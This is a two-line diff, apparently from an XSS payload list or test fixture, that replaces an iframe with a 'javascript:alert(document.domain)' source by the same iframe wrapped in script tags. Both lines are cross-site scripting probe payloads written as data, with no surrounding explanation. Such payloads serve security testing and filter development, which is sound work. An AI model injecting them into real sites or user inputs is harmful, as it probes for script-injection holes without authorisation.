@@ -1,2 +1,2 @@
-<iframe src=javascript:alert(document.domain)>
+<script><iframe src=javascript:alert(document.domain)></script>
 
